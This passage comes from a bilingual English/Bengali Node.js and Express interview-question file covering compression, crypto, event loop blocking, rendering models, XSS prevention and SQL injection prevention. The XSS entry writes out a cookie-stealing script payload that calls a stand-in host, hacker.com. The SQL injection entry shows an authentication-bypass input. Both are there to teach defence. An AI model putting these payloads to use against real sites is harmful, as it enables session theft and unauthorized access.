মিউটেশন রেসপন্সে সর্বদা নতুন তৈরি বা মডিফাই হওয়া অবজেক্টটির ডাটা রিটার্ন করুন। এতে ফ্রন্টএন্ড ক্যাশ লাইব্রেরি (Apollo Client) কোনো অতিরিক্ত এপিআই হিট ছাড়াই পেজের ভিউ আপডেট করতে পারে।

### সাধারণ ভুলসমূহ
কুয়েরির (Query) ভেতর ডাটা ডিলিট বা আপডেটের মেকানিজম লিখে রাখা। এতে ট্র্যাকিং কনফ্লিক্ট দেখা দেয় এবং সিকিউরিটি হোল তৈরি হয়।

### Code Example
\`\`\`javascript
// কুয়েরি ও মিউটেশনের স্কিমা কনফিগারেশন
const typeDefs = \`
  type User {
    id: ID!
    name: String!
  }

  type Query {
    getUser(id: ID!): User
  }

  type Mutation {
    createUser(name: String!): User!
  }
\`;

// রিজলভার ডাটা লজিক
const users = [];
const resolvers = {
  Query: {
    getUser: (_, { id }) => users.find(u => u.id === id)
  },
  Mutation: {
    createUser: (_, { name }) => {
      const newUser = { id: String(users.length + 1), name };
      users.push(newUser);
      return newUser;
    }
  }
};
\`\`\``
  },
  {
    id: 'node-express-61',
    title: 'Explain data compression in Node.js using the zlib module.',
    difficulty: 'intermediate',
    category: 'node-express',
    tags: ['Node.js', 'Performance', 'Compression', 'Zlib'],
    enAnswer: 'The zlib module provides compression and decompression functionalities using Gzip, Deflate, or Brotli algorithms. Express applications can leverage this via compression middleware to gzip HTTP responses, saving server bandwidth and accelerating page loads.',
    bnAnswer: 'zlib মডিউলটি Gzip, Deflate বা Brotli অ্যালগরিদম ব্যবহার করে ডাটা কম্প্রেশন ও ডিকম্প্রেশন সুবিধা প্রদান করে। এক্সপ্রেস অ্যাপে compression মিডলওয়্যার ব্যবহার করে এইচটিটিপি রেসপন্স সাইজ কমানো যায়, যা ব্যান্ডউইডথ সাশ্রয় করে।',
    enExplanation: `### Explanation
Transmitting heavy JSON or HTML files over HTTP consumes network bandwidth and slows page rendering.
- **Compression formats**:
  - **Gzip**: Standard compression supported by almost all browsers.
  - **Brotli**: Modern format providing up to 20-30% better compression than Gzip, supported by modern browsers.
- **Node.js \`zlib\`**: Native library that handles binary stream transformations.
- In Express, mounting the \`compression\` middleware automatically checks browser \`Accept-Encoding\` headers and gzips/brotlis responses if supported.

### Real-World Example
If your server returns a heavy 500KB JSON user list response:
- **Without compression**: 500KB travels over the network.
- **With Gzip enabled**: The response size is compressed to ~70KB, making network transport over 3G/4G connections 7 times faster.

### Best Practice
Always enable gzip compression in your routing pipeline or let a reverse proxy (like Nginx) handle it before requests reach Node.js. Avoid compression on already compressed file formats (like JPG/PNG images or ZIP files), as compressing them again wastes server CPU cycles without reducing size.

### Common Mistakes
Compressing very small files (e.g. less than 1KB), where the CPU overhead of running the compression algorithm exceeds the network transfer benefits.

### Code Example
\`\`\`javascript
const express = require('express');
const compression = require('compression');
const app = express();

// Enable compression middleware for all responses
app.use(compression({
  threshold: 1024, // Only compress responses larger than 1KB
  filter: (req, res) => {
    // Standard filter callback helper
    return compression.filter(req, res);
  }
}));

app.get('/api/heavy-data', (req, res) => {
  // Return large text block
  res.json({ data: 'Large text data '.repeat(500) });
});

const server = app.listen(3000, () => server.close());
\`\`\``,
    bnExplanation: `### ব্যাখ্যা
এইচটিটিপি নেটওয়ার্কে বড় আকারের জেএসন বা এইচটিএমএল ফাইল পাঠানো ব্যান্ডউইডথ খরচ বাড়ায় এবং ব্রাউজার লোড ধীর করে।
- **কম্প্রেশন ফরম্যাট**:
  - **Gzip**: সব ব্রাউজারে সমর্থিত স্ট্যান্ডার্ড কম্প্রেশন।
  - **Brotli**: আধুনিক ফরম্যাট যা জিজিপ (Gzip) থেকে ২০-৩০% বেশি ডাটা কমপ্রেস করে।
- **\`zlib\`**: নোডের নেটিভ লাইব্রেরি যা ফাইল কম্প্রেস করতে স্ট্রিম ট্রান্সফর্ম মেথড ব্যবহার করে।
- এক্সপ্রেসে \`compression\` মিডলওয়্যার যুক্ত করলে ব্রাউজারের \`Accept-Encoding\` হেডার রিড করে অটোমেটিক ডাটা জিপ ফরম্যাটে সেন্ড করা হয়।

### বাস্তব-ভিত্তিক উদাহরণ
সার্ভার থেকে ৫০০ কেবি ওজনের একটি ইউজার তালিকা রেসপন্স পাঠানো হচ্ছে:
- **কম্প্রেশন ছাড়া**: সম্পূর্ণ ৫০০ কেবি ফাইল নেটওয়ার্কে ট্রাভেল করবে।
- **Gzip সচল থাকলে**: ফাইলটি কম্প্রেস হয়ে মাত্র ৭০ কেবি তে নেমে আসবে, ফলে ধীরগতির ৩জি/৪জি নেটওয়ার্কেও পেজ দ্রুত রেন্ডার হবে।

### উত্তম অনুশীলন
আপনার সার্ভার পাইপলাইনে কম্প্রেশন মিডলওয়্যার সেট করুন অথবা এনগিনক্স (Nginx) রিভার্স প্রক্সি সার্ভার দিয়ে এটি হ্যান্ডেল করান। পূর্বেই কম্প্রেস থাকা ফাইল ফরম্যাটে (যেমন: PNG, JPG বা MP4) কম্প্রেশন রান করাবেন না, এতে সাইজ না কমে উল্টো সিপিইউ সাইকেল নষ্ট হয়।

### সাধারণ ভুলসমূহ
১ কেবির চেয়ে ছোট ফাইলগুলোকেও কম্প্রেস করতে চেষ্টা করা, যেখানে সিপিইউর অ্যালগরিদম চালানোর সময়ের খরচ নেটওয়ার্ক স্পিডের চেয়ে বেশি হয়ে দাঁড়ায়।

### Code Example
\`\`\`javascript
const express = require('express');
const compression = require('compression');
const app = express();

// রেসপন্স কম্প্রেশন মিডলওয়্যার অন করা
app.use(compression({
  threshold: 1024, // কেবল ১ কেবির বেশি ওজনের ফাইল জিপ করবে
  filter: (req, res) => {
    return compression.filter(req, res);
  }
}));

app.get('/api/heavy-data', (req, res) => {
  res.json({ data: 'ভারী ডাটা বা টেক্সট '.repeat(500) });
});

const server = app.listen(3000, () => server.close());
\`\`\``
  },
  {
    id: 'node-express-62',
    title: 'Explain cryptographic operations using Node.js crypto module.',
    difficulty: 'intermediate',
    category: 'node-express',
    tags: ['Node.js', 'Core Modules', 'Crypto', 'Security'],
    enAnswer: 'The crypto module provides cryptographic functionality. It is used to generate secure random bytes (crypto.randomBytes), perform one-way hashing (crypto.createHash), and run symmetric encryption/decryption (crypto.createCipheriv/createDecipheriv).',
    bnAnswer: 'crypto মডিউলটি ক্রিপ্টোগ্রাফিক বা গোপনীয়তা রক্ষার মেথডসমূহ প্রদান করে। এটি সিকিউর র্যান্ডম বাইট জেনারেট (crypto.randomBytes), একমুখী হ্যাশ তৈরি (crypto.createHash) এবং সিমেট্রিক এনক্রিপশন-ডিক্রিপশন (createCipheriv) করতে ব্যবহৃত হয়।',
    enExplanation: `### Explanation
The \`crypto\` module provides a wrapper around OpenSSL.
Common Cryptographic Operations:
1. **Hashing (One-way)**: Generates a fixed-size fingerprint of data. Commonly used to hash strings (like file integrity checks or token indexing).
   - Method: \`crypto.createHash('sha256').update(data).digest('hex')\`.
2. **Symmetric Encryption (Two-way)**: Encrypts data using a single shared key, allowing decryption later.
   - Requires an Initialization Vector (IV) and algorithm key (e.g. \`aes-256-cbc\`).
3. **Random Bytes**: Generates cryptographically secure random values (unlike \`Math.random()\` which is pseudo-random and unsafe).
   - Method: \`crypto.randomBytes(size)\`.

### Real-World Example
When creating secure token-based password reset links, using \`crypto.randomBytes(32).toString('hex')\` generates a cryptographically secure token that hackers cannot predict or brute-force.

### Best Practice
For hashing passwords, use \`bcrypt\` or \`argon2\` instead of plain SHA-256 from \`crypto\`, as SHA-256 is too fast and vulnerable to hardware-accelerated GPU brute-forcing. Use \`crypto.randomBytes()\` for session IDs, password salts, and security keys.

### Common Mistakes
Using \`Math.random()\` to generate security tokens, database keys, or temporary passwords, which exposes the system to predictability exploits.

### Code Example
\`\`\`javascript
const crypto = require('crypto');

// 1. Generate secure random token
const token = crypto.randomBytes(16).toString('hex');
console.log("Secure Token:", token);

// 2. Hash a message (SHA-256)
const message = 'secret message';
const hash = crypto.createHash('sha256').update(message).digest('hex');
console.log("SHA-256 Hash:", hash);
\`\`\``,
    bnExplanation: `### ব্যাখ্যা
\`crypto\` মডিউলটি ওপেনএসএসএল (OpenSSL) লাইব্রেরির ওপর ভিত্তি করে ক্রিপ্টোগ্রাফিক সলিউশন দেয়।
প্রধান ফিচারসমূহ:
১. **হ্যাশিং (একমুখী)**: ডাটার একটি ইউনিক ফিক্সড ফিঙ্গারপ্রিন্ট তৈরি করে।
   - মেথড: \`crypto.createHash('sha256').update(data).digest('hex')\`।
২. **সিমেট্রিক এনক্রিপশন (দ্বিমুখী)**: একটি নির্দিষ্ট কী দিয়ে ডাটা লক করা যা পরবর্তীতে আবার রিড করা যায়।
   - এর জন্য অ্যালগরিদম (যেমন: \`aes-256-cbc\`) ও ইনিশিয়ালাইজেশন ভেক্টর (IV) লাগে।
৩. **র্যান্ডম বাইট**: ক্রিপ্টোগ্রাফিক্যালি নিরাপদ র্যান্ডম ডাটা তৈরি করে (যা \`Math.random()\` এর মতো প্রি-ডিফাইন্ড সূত্র মেনে চলে না)।
   - মেথড: \`crypto.randomBytes(size)\`।

### বাস্তব-ভিত্তিক উদাহরণ
পাসওয়ার্ড রিসেট লিংক তৈরি করতে ৩০ অক্ষরের একটি র্যান্ডম কী প্রয়োজন। \`crypto.randomBytes(16).toString('hex')\` ব্যবহার করলে একটি হ্যাকার-প্রুফ সিকিউর টোকেন জেনারেট হবে।

### উত্তম অনুশীলন
পাসওয়ার্ড হ্যাশ করতে সরাসরি SHA-256 ব্যবহার না করে \`bcrypt\` ব্যবহার করুন। SHA-256 অত্যন্ত দ্রুত গতিতে রান হওয়ায় জিপিইউ জিপিইউ দিয়ে ব্রুট-ফোর্স করা তুলনামূলক সহজ। কাস্টম টোকেন ও সল্টের জন্য সর্বদা \`crypto.randomBytes()\` ব্যবহার করুন।

### সাধারণ ভুলসমূহ
সিকিউরিটি টোকেন বা ওটিপি (OTP) কোড জেনারেট করতে সাধারণ \`Math.random()\` ব্যবহার করা, কারণ এটি প্রেডিক্টেবল বা অনুমেয় হওয়ায় হ্যাক হওয়ার রিস্ক থাকে।

### Code Example
\`\`\`javascript
const crypto = require('crypto');

// ১. সিকিউর র্যান্ডম টোকেন তৈরি
const token = crypto.randomBytes(16).toString('hex');
console.log("সিকিউর টোকেন:", token);

// ২. SHA-256 হ্যাশ তৈরি
const message = 'গোপন বার্তা';
const hash = crypto.createHash('sha256').update(message).digest('hex');
console.log("SHA-256 হ্যাশ কোড:", hash);
\`\`\``
  },
  {
    id: 'node-express-63',
    title: 'How do you identify and avoid Event Loop blocking in Node.js?',
    difficulty: 'intermediate',
    category: 'node-express',
    tags: ['Node.js', 'Event Loop', 'Performance', 'Profiling'],
    enAnswer: 'Event Loop blocking is identified by measuring execution delays or using profiling tools (like clinic.js or --inspect). To avoid blocking, delegate CPU-intensive tasks (like hashing or compression) to Libuv thread pool via native async APIs, use Worker Threads, or divide tasks into smaller execution chunks.',
    bnAnswer: 'ইভেন্ট লুপ ব্লকিং সনাক্ত করতে এক্সিকিউশন ডিলে পরিমাপ করা বা প্রোফাইলিং টুলস (যেমন clinic.js) ব্যবহার করা হয়। এটি এড়াতে সিপিইউ-ভারী কাজগুলো নেটিভ অ্যাসিনক্রোনাস এপিআই, ওয়ার্কার থ্রেড (Worker Threads) অথবা কাজটিকে ছোট ছোট অংশে ভাগ করে সম্পন্ন করা হয়।',
    enExplanation: `### Explanation
Because JavaScript is single-threaded, if a synchronous function takes 2 seconds to execute, the main thread cannot process any other task during that time.
Common sources of Event Loop blocking:
1. **JSON parsing**: Running \`JSON.parse()\` or \`JSON.stringify()\` on massive array data (e.g. 50MB files).
2. **Synchronous CPU Operations**: RegEx matches on long text files, large math computations, image formatting, or encryption keys.
3. **Synchronous File System Calls**: Using \`fs.readFileSync()\` inside API handlers.

How to Avoid:
- **Asynchronous Wrappers**: Use native async methods (e.g. \`crypto.pbkdf2\` uses the Libuv thread pool, keeping the main thread free).
- **Worker Threads**: Offload CPU computations to worker threads.
- **Decomposition**: Break loops into chunks using \`setImmediate()\` calls to let other events execute in between.

### Real-World Example
If your server calculates Fibonacci numbers on the main thread, a single visitor requesting \`fibonacci(45)\` freezes the site for everyone. Moving this computation to a Worker Thread keeps the site running smoothly for other users.

### Best Practice
Monitor your event loop health using APM tools (e.g., Datadog, New Relic) or packages like \`blocked-at\`. Keep route controller execution times under 10-20ms before handing off to async microtasks.

### Common Mistakes
Believing that wrapping a synchronous blocking loop in an \`async\` function or a \`Promise\` makes it non-blocking. A synchronous loop inside a Promise *still* runs on the main thread and blocks the event loop.

### Code Example
\`\`\`javascript
// BLOCKED: blocks the event loop for a long time
function blockLoop() {
  const start = Date.now();
  while (Date.now() - start < 100) {
    // Blocks main thread for 100ms
  }
}

// NON-BLOCKED: splits CPU tasks using setImmediate to yield control back to the Event Loop
function unblockLoop(iterations, callback) {
  let i = 0;
  function doChunk() {
    if (i < iterations) {
      i++;
      setImmediate(doChunk); // yields control back to event loop, schedules next chunk
    } else {
      callback();
    }
  }
  doChunk();
}

console.log("Unblocking demonstration initialized.");
\`\`\``,
    bnExplanation: `### ব্যাখ্যা
জাভাস্ক্রিপ্ট সিঙ্গেল-থ্রেডেড হওয়ায় কোনো সিনক্রোনাস কাজ যদি রান হতে ২ সেকেন্ড সময় নেয়, তবে ওই ২ সেকেন্ড মেইন থ্রেড কোনো রিকোয়েস্ট রেসপন্স করতে পারবে না।
ইভেন্ট লুপ ব্লক হওয়ার মূল উৎসসমূহ:
১. **জেএসন পার্সিং**: বিশাল ফাইলের ওপর \`JSON.parse()\` বা \`JSON.stringify()\` চালানো।
২. **সিপিইউ-ভারী কাজ**: বড় স্ট্রিংয়ে জটিল রেগুলার এক্সপ্রেশন (RegEx) মিলানো, ক্রিপ্টোগ্রাফি কোড।
৩. **সিনক্রোনাস এপিআই**: এপিআই কন্ট্রোলারের ভেতর \`fs.readFileSync()\` বা সমতুল্য কোড রাখা।

ব্লক এড়ানোর উপায়:
- **অ্যাসিনক্রোনাস ফাংশন**: নেটিভ অ্যাসিনক লাইব্রেরি ব্যবহার করা (যেমন ক্রিপ্টো মডিউল লিবিউভি থ্রেড পুলে কাজ করায়)।
- **ওয়ার্কার থ্রেড**: সিপিইউর ভারী কাজগুলো প্রসেসের আলাদা মডিউলে (Worker Threads) পাঠিয়ে দেওয়া।
- **ডিকম্পোজিশন**: বড় লুপকে \`setImmediate()\` দিয়ে টুকরো করে নেওয়া যাতে লুপের মাঝখানে অন্য রিকোয়েস্ট রান হতে পারে।

### বাস্তব-ভিত্তিক উদাহরণ
সার্ভারের মেইন থ্রেডে যদি জটিল গাণিতিক হিসাব বা ফিড ক্যালকুলেশন রান করা হয়, তবে একজন ইউজারের কুয়েরির জন্য বাকি সব ভিজিটরের স্ক্রিন লোড হওয়া বন্ধ হয়ে যাবে। এটি ওয়ার্কার থ্রেডে পাঠিয়ে দিলে লুপ ফ্রি থাকবে।

### উত্তম অনুশীলন
অ্যাপ্লিকেশন পারফরম্যান্স মনিটর (APM) বা \`blocked-at\` প্যাকেজ দিয়ে ইভেন্ট লুপের ল্যাটেন্সি ট্র্যাক করুন। কন্ট্রোলারের মেইন লাইন এক্সিকিউশন সর্বদা ১০-২০ মিলি সেকেন্ডের মধ্যে সীমাবদ্ধ রাখুন।

### সাধারণ ভুলসমূহ
মনে করা যে সিনক্রোনাস লুপকে \`async\` ফাংশন বা \`Promise\` এর ভেতর রাখলে তা নন-ব্লকিং হয়ে যায়। প্রমিজের ভেতরের সিনক্রোনাস কোডও মেইন থ্রেডেই চলে এবং ইভেন্ট লুপ ব্লক করে।

### Code Example
\`\`\`javascript
// ব্লকিং: এটি মেইন থ্রেডকে ১০০ মিলি সেকেন্ডের জন্য সম্পূর্ণ আটকে দেবে
function blockLoop() {
  const start = Date.now();
  while (Date.now() - start < 100) {
    // ১০০ms এর জন্য থ্রেড লক
  }
}

// নন-ব্লকিং: setImmediate দিয়ে কাজকে টুকরো করে ইভেন্ট লুপকে সচল রাখা
function unblockLoop(iterations, callback) {
  let i = 0;
  function doChunk() {
    if (i < iterations) {
      i++;
      setImmediate(doChunk); // ইভেন্ট লুপে ব্রেক দিয়ে পরবর্তী অংশ শিডিউল করে
    } else {
      callback();
    }
  }
  doChunk();
}

console.log("ইভেন্ট লুপ ব্লকিং এড়ানোর ডেমো প্রস্তুত।");
\`\`\``
  },
  {
    id: 'node-express-64',
    title: 'Explain Express Template Engines vs Single Page Application (SPA) API-only setups.',
    difficulty: 'intermediate',
    category: 'node-express',
    tags: ['Express.js', 'Template Engines', 'SPA', 'Architecture'],
    enAnswer: 'Template Engines (like EJS, Pug) perform Server-Side Rendering (SSR) by combining HTML layouts with database values on the server before sending raw HTML. SPA setups (like React, Vue) use Express as an API-only server returning JSON, offloading HTML compilation to the client browser.',
    bnAnswer: 'টেমপ্লেট ইঞ্জিন (যেমন EJS, Pug) সার্ভার-সাইড রেন্ডারিং (SSR) এর মাধ্যমে ডাটা ও এইচটিএমএল ডিজাইন যুক্ত করে সম্পূর্ণ পেজ সার্ভারেই তৈরি করে ব্রাউজারে পাঠায়। SPA লেআউট (যেমন React) এক্সপ্রেসকে কেবল জেএসন এপিআই সার্ভার হিসেবে ব্যবহার করে রেন্ডারিংয়ের কাজ ব্রাউজারে ছেড়ে দেয়।',
    enExplanation: `### Explanation
How HTML is delivered to users:
1. **Template Engines (Server-Side Rendering)**:
   - Formats: EJS, Pug, Handlebars.
   - Flow: Request hits server -> Express queries Database -> Template engine compiles data into HTML string -> Browser receives completed webpage.
   - Pros: Excellent SEO (search crawlers see HTML immediately), faster initial load, no frontend build pipelines.
2. **SPA API-Only Setup (Client-Side Rendering)**:
   - Flow: Browser downloads blank HTML/JS React code bundle -> React requests JSON from Express API (\`/api/products\`) -> React compiles the JSON and renders HTML dynamically in browser.
   - Pros: Highly interactive UI, clean separation of frontend and backend teams, single API can serve both Web and Mobile apps.

### Real-World Example
- **EJS Route**: \`res.render('profile', { user })\` sends a pre-rendered HTML document containing user details.
- **SPA API Route**: \`res.json({ id: 1, name: 'Rohit' })\` sends only the raw data, letting React handle the layout.

### Best Practice
For administrative dashboards, mobile-focused web products, or complex SaaS apps, build a stateless Express API only and host the frontend independently (on Vercel/Netlify). For content-heavy marketing pages or simple blogs, template engines or Server-Side rendering is preferred for SEO.

### Common Mistakes
Building heavy Single Page Applications with huge code bundles and wondering why search engines struggle to index the dynamic content, when a simple template engine or server-side setup would have solved it.

### Code Example
\`\`\`javascript
const express = require('express');
const app = express();

// 1. Setting up template engine (EJS)
app.set('view engine', 'ejs');

// Render HTML template
app.get('/profile-ssr', (req, res) => {
  // res.render('profile', { username: 'Rohit' });
  res.send('<h1>Server Rendered HTML Mock</h1>'); // Simulated output
});

// 2. API-only endpoint for SPAs
app.get('/api/profile', (req, res) => {
  res.json({ username: 'Rohit' }); // Returns pure JSON
});

const server = app.listen(3000, () => server.close());
\`\`\``,
    bnExplanation: `### ব্যাখ্যা
এইচটিএমএল ফাইল ব্যবহারকারীর কাছে ডেলিভারি করার দুটি মূল পদ্ধতি:
১. **টেমপ্লেট ইঞ্জিন (সার্ভার-সাইড রেন্ডারিং - SSR)**:
   - ইঞ্জিনসমূহ: EJS, Pug, Handlebars।
   - কাজের ধারা: ব্রাউজার রিকোয়েস্ট পাঠায় -> সার্ভার ডাটা কোয়েরি করে টেমপ্লেট কোডে ডাটা বসিয়ে পূর্ণাঙ্গ এইচটিএমএল পেজ জেনারেট করে ব্রাউজারে পাঠায়।
   - সুবিধা: দারুণ এসইও (SEO) ফ্রেন্ডলি এবং প্রথম পেজ লোড স্পিড বেশি।
২. **SPA এপিআই-অনলি সেটআপ (ক্লায়েন্ট-সাইড রেন্ডারিং - CSR)**:
   - কাজের ধারা: ব্রাউজার খালি এইচটিএমএল ও রিয়্যাক্ট ফাইল নামায় -> রিয়্যাক্ট কোড এক্সপ্রেস সার্ভার থেকে জেএসন ডেটা রিকোয়েস্ট করে -> ডাটা নিয়ে রিয়্যাক্ট নিজে পেজ রেন্ডার করে।
   - সুবিধা: রিচ ইন্টারঅ্যাক্টিভ ইউজার ইন্টারফেস এবং মোবাইল অ্যাপের জন্যও একই এপিআই ব্যবহার করা যায়।

### বাস্তব-ভিত্তিক উদাহরণ
- **EJS রাউট**: \`res.render('profile', { user })\` ইউজারের পূর্ণাঙ্গ প্রোফাইল ডিজাইনের ফাইল সেন্ড করে।
- **SPA এপিআই রাউট**: \`res.json({ id: 1 })\` কেবল র-জেএসন পাঠায়, ডিজাইন ও রেন্ডারিংয়ের কাজ ব্রাউজারে রিয়্যাক্ট হ্যান্ডেল করে।

### উত্তম অনুশীলন
অ্যাডমিন ড্যাশবোর্ড, মোবাইল অ্যাপ বা ভারী ইন্টারঅ্যাক্টিভ অ্যাপের জন্য স্টেটলেস এপিআই ডিজাইন করুন এবং ফ্রন্টএন্ড আলাদা হোস্ট করুন। তবে ব্লগ বা ই-কমার্স সাইটের ক্ষেত্রে যেখানে এসইও রিকোয়ারমেন্ট বেশি, সেখানে টেমপ্লেট রেন্ডারিং বা সার্ভার-সাইড মেকানিজম ব্যবহার করুন।

### সাধারণ ভুলসমূহ
এসইও-নির্ভর কন্টেন্ট সাইটের জন্য ক্লায়েন্ট-সাইড রিয়্যাক্ট প্রজেক্ট তৈরি করা এবং সার্চ ইঞ্জিনে পেজ ইনডেক্স না হওয়ার জটিলতায় পড়া। এ ধরনের প্রজেক্টে সাধারণ টেমপ্লেট বা এসএসআর পদ্ধতি ব্যবহার করা সুবিধাজনক।

### Code Example
\`\`\`javascript
const express = require('express');
const app = express();

// ১. টেমপ্লেট ইঞ্জিন ইজেএস (EJS) সেটআপ করা
app.set('view engine', 'ejs');

// সার্ভার সাইড রেন্ডারড রাউট
app.get('/profile-ssr', (req, res) => {
  // res.render('profile', { username: 'Rohit' });
  res.send('<h1>সার্ভার রেন্ডারড এইচটিএমএল ভিউ</h1>'); 
});

// ২. এসপিএ (SPA) ফ্রন্টএন্ডের জন্য জেএসন এপিআই রাউট
app.get('/api/profile', (req, res) => {
  res.json({ username: 'Rohit' }); 
});

const server = app.listen(3000, () => server.close());
\`\`\``
  },
  {
    id: 'node-express-65',
    title: 'Explain Cross-Site Scripting (XSS) prevention in Express.js.',
    difficulty: 'intermediate',
    category: 'node-express',
    tags: ['Express.js', 'Security', 'XSS', 'Sanitization'],
    enAnswer: 'XSS occurs when malicious scripts are injected into trusted websites. In Express, prevent XSS by sanitizing and escaping all user inputs (using express-validator), configuring strict Content-Security-Policy (CSP) headers via Helmet, and securing cookies with httpOnly.',
    bnAnswer: 'XSS (Cross-Site Scripting) ঘটে যখন ক্ষতিকারক স্ক্রিপ্ট বিশ্বস্ত ওয়েবসাইটে ইনজেক্ট করা হয়। এক্সপ্রেসজেএস-এ এটি প্রতিরোধে ইউজার ইনপুট স্যানিটাইজ ও এস্কেপ করা হয়, হেলমেটের মাধ্যমে কড়া সিএসপি (CSP) হেডার সেট করা হয় এবং কুকিতে httpOnly প্রোপার্টি ব্যবহার করা হয়।',
    enExplanation: `### Explanation
XSS attacks allow hackers to execute malicious scripts in a user's browser, leading to session hijacking, cookie theft, or page defacing:
1. **Input Sanitization**: Use \`express-validator\`'s \`escape()\` method. This converts characters like \`<\` and \`>\` into safe HTML entities (\`&lt;\` and \`&gt;\`), preventing browser scripts from executing.
2. **HTTP Headers (CSP)**: Helmet sets the \`Content-Security-Policy\` header, preventing browsers from loading scripts from unauthorized domains.
3. **Session Security**: Always set \`httpOnly: true\` on your session and auth cookies. This prevents client-side JavaScript (\`document.cookie\`) from reading authorization tokens.

### Real-World Example
A user submits a comment containing: \`<script>fetch('http://hacker.com?cookie=' + document.cookie)</script>\`.
- **Without XSS prevention**: The script saves to the database. When other users view the comment, the script runs, stealing their sessions.
- **With XSS prevention**: The input is sanitized before saving, converting it to safe, unexecutable text.

### Best Practice
Treat all user input as untrusted. Never use APIs that disable HTML escaping on the client-side (such as React's \`dangerouslySetInnerHTML\`) without first running the raw HTML through a sanitization library like \`dompurify\`.

### Common Mistakes
Relying solely on frontend validation. Frontend checks are easily bypassed using tools like Postman or curl. Always validate and sanitize inputs on the server.

### Code Example
\`\`\`javascript
const express = require('express');
const { body, validationResult } = require('express-validator');
const app = express();

app.use(express.json());

// XSS Prevention: Sanitizing and escaping the comment body
app.post('/api/comments', 
  body('text').trim().escape(), // Escapes HTML tags (e.g. <script> -> &lt;script&gt;)
  (req, res) => {
    const errors = validationResult(req);
    if (!errors.isEmpty()) {
      return res.status(400).json({ errors: errors.array() });
    }
    
    // req.body.text is now safe to store and render
    console.log("Safe text saved:", req.body.text);
    res.json({ success: true, text: req.body.text });
  }
);

const server = app.listen(3000, () => server.close());
\`\`\``,
    bnExplanation: `### ব্যাখ্যা
এক্সএসএস (XSS) আক্রমণের মাধ্যমে হ্যাকাররা অন্য ইউজারের ব্রাউজারে ক্ষতিকর স্ক্রিপ্ট রান করিয়ে সেশন টোকেন বা কুকি চুরি করতে পারে:
১. **ইনপুট স্যানিটাইজেশন**: \`express-validator\`-এর \`escape()\` মেথড ব্যবহার করা। এটি ব্র্যাকেট \`<\` ও \`>\` কে সেফ কোডে কনভার্ট করে (যেমন: \`&lt;\`), ফলে ব্রাউজারে এটি স্ক্রিপ্ট হিসেবে রান হতে পারে না।
২. **এইচটিটিপি হেডার (CSP)**: হেলমেটের কন্টেন্ট সিকিউরিটি পলিসি স্ক্রিপ্ট ডাউনলোডের সোর্স লিমিট করে দেয়।
৩. **নিরাপদ কুকি**: কুকি সেটিংসে \`httpOnly: true\` ব্যবহার করুন। এর ফলে জাভাস্ক্রিপ্ট স্ক্রিপ্ট দিয়ে কেউ কুকির অ্যাক্সেস পাবে না।

### বাস্তব-ভিত্তিক উদাহরণ
মন্তব্য বক্সে হ্যাকার ইনপুট দিল: \`<script>fetch('http://hacker.com?cookie=' + document.cookie)</script>\`।
- **প্রতিরোধ ব্যবস্থা ছাড়া**: এটি ডাটাবেসে সেভ হবে এবং অন্য কোনো ভিজিটর পেজ লোড করলেই হ্যাকারের সার্ভারে কুকি চলে যাবে।
- **XSS প্রতিরোধ সহ**: ডাটাবেসে সেভ করার আগেই এস্কেপ করার ফলে এটি নিরীহ সাধারণ টেক্সটে রূপান্তরিত হয়ে সেভ হবে।

### উত্তম অনুশীলন
ইউজারের কোনো ডাটাকেই ১০০% নিরাপদ ভাববেন না। ফ্রন্টএন্ডে রেন্ডার করার সময় র-এইচটিএমএল রেন্ডারিং ডিক্লেয়ারেশন (যেমন: React-এর \`dangerouslySetInnerHTML\`) এড়িয়ে চলুন অথবা \`dompurify\` লাইব্রেরি ব্যবহার করুন।

### সাধারণ ভুলসমূহ
শুধু ফ্রন্টএন্ড বা রিয়্যাক্ট কোডে ভ্যালিডেশন চেক করা। হ্যাকাররা সরাসরি পোস্টম্যান ব্যবহার করে সার্ভারে ইনজেকশন স্ক্রিপ্ট পাঠাতে পারে, তাই ব্যাকএন্ডে স্যানিটাইজ করা বাধ্যতামূলক।

### Code Example
\`\`\`javascript
const express = require('express');
const { body, validationResult } = require('express-validator');
const app = express();

app.use(express.json());

// XSS প্রতিরোধ: টেক্সট ইনপুট এস্কেপ করা
app.post('/api/comments', 
  body('text').trim().escape(), // এইচটিএমএল ট্যাগ নিষ্ক্রিয় করে দেবে
  (req, res) => {
    const errors = validationResult(req);
    if (!errors.isEmpty()) {
      return res.status(400).json({ errors: errors.array() });
    }
    
    // ডাটাবেসে সেভ করার জন্য এখন সুরক্ষিত
    console.log("সুরক্ষিত টেক্সট:", req.body.text);
    res.json({ success: true, text: req.body.text });
  }
);

const server = app.listen(3000, () => server.close());
\`\`\``
  },
  {
    id: 'node-express-66',
    title: 'Explain SQL Injection prevention in Node.js applications.',
    difficulty: 'intermediate',
    category: 'node-express',
    tags: ['Node.js', 'Security', 'SQL Injection', 'Database'],
    enAnswer: 'SQL Injection occurs when untrusted user input is directly concatenated into SQL queries. Prevent this by using parameterized queries (prepared statements), where inputs are treated as data parameters rather than executable code, or using Object-Relational Mappers (ORMs) like Prisma or Sequelize.',
    bnAnswer: 'SQL ইনজেকশন ঘটে যখন ডাটাবেস কুয়েরির সাথে সরাসরি ইউজারের ইনপুট স্ট্রিং জোড়াতালি দিয়ে কুয়েরি করা হয়। এটি প্রতিরোধে প্যারামিটারাইজড কোয়েরি (প্রিপেয়ার্ড স্টেটমেন্ট) অথবা প্রিজমা/সিকুয়ালাইজের মতো ORM লাইব্রেরি ব্যবহার করা হয়, যা ইনপুটকে কোড হিসেবে না দেখে ডাটা হিসেবে বিবেচনা করে।',
    enExplanation: `### Explanation
SQL Injection allows malicious users to bypass authentication, access unauthorized data tables, or drop database collections:
1. **concatenation vulnerability**:
   - Vulnerable code: \`"SELECT * FROM users WHERE email = '" + req.body.email + "'"\`
   - If a user inputs \`admin@test.com' OR '1'='1\`, the database processes it as:
     \`\`\`sql
     SELECT * FROM users WHERE email = 'admin@test.com' OR '1'='1'
     \`\`\`
     Since \`'1'='1'\` is always true, the database bypasses authentication checks entirely and grants access to the first user record.
2. **Prepared Statements**: Parameterized inputs placeholders (like \`?\` or \`$1\`) decouple the SQL statement compilation from the input variables. The SQL statement engine compiles the query template first, and then binds the input variables purely as data values.

### Real-World Example
Using modern database drivers like \`pg\` or \`mysql2\`, passing query parameters as an array separate from the query string ensures safety:
\`\`\`javascript
db.query('SELECT * FROM users WHERE email = ?', [req.body.email]);
\`\`\`

### Best Practice
Never use string concatenation or template literals (\` \` \`) to write raw SQL queries containing user parameters. Always utilize ORMs (Sequelize, Prisma) or write parameterized queries strictly.

### Common Mistakes
Thinking database queries are safe if they use ESM module structures. The vulnerability is caused by query string parsing rules, not module systems.

